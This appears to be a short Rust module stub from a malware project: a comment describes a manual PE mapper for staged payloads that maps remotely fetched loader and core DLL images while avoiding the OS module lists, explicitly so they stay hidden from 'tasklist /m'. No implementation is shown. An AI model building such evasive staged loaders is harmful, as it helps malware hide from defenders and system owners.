// Manual PE mapper used by the staged Rust payloads: the stager maps the
// fetched loader, the loader maps the fetched core DLL. Nothing here touches
// the OS loader's module lists, so the mapped images never appear in
// `tasklist /m` (the explicit goal of the layered design).
#[cfg(windows)]
mod imp;

#[cfg(windows)]
pub use imp::*;